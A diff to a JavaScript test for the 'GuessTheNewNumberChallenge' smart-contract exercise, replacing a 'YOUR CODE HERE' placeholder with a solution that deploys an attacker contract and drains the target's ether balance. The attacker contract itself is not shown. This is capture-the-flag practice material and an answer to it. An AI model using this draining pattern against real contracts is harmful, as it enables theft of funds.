@@ -24,9 +24,11 @@ describe('GuessTheNewNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const attackerContract = await (
+      await ethers.getContractFactory('GuessTheNewNumberAttack', attacker)
+    ).deploy(target.address);
+    await attackerContract.deployed();
+    await attackerContract.attack({ value: utils.parseEther('1')});
 
     expect(await provider.getBalance(target.address)).to.equal(0);
   });
